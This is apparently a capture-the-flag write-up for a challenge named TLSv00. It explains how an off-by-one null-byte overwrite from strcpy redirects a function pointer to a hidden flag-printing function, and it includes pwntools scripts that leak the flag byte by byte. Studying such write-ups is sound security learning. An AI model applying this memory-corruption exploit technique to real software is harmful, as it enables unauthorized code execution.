# TLSv00

I didn't really enjoy this challenge, it is one of those challenges that feels piloted.

The challenge starts with generating a key with a key len of 63.

```c
generate_key(63);
```
which by pure sussyness is just a byte away from the max key len of 64 written in the generate_key() function.

```c
if (key_len > 0 && key_len <= 64) { ...
```
Now what happens when i put in a key len of 64?

Since the key gets copied from a buffer using the strcpy() function, it will copy the key up  until the null byte INCLUDED.

The buffer where the key is stored first gets memsetted to 0, this means that the last byte of the key will always be overwritten with a null byte.

Now, there's this function called print_flag() that loads into a function pointer the address of the function stored at f_do_comment(). Which CASUALLY differs by 1 byte from the address of the real_print_flag() function.

```c
if (get_char() == 'y') {
    do_domment = (void (*)())f_do_comment;
    ...
```
So by first loading the f_do_comment() function address into the function pointer and then putting a key_len of 64 we can overwrite the function pointer to make it point to print_real_flag()

```py
p.recvuntil(b'> ')
p.sendline(b'3')
p.sendlineafter(b'instead?',b'y')
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendlineafter(b'key len: ',b'64')
```
Now, increasingly one by one we call the print_real_flag() function as we increase the size of the key, so one by one the i-th character of the flag will get xorred with 0, printing it plain.
    
```py
flag = b'F'

for i in range(64):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendlineafter(b'key len: ',str(i))
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(b'3')
    p.sendafter(b'instead? ',b'n')
    if i > 0:
        flag += p.recvuntil(b'1.')[:-2][i:i+1]

print(flag)
```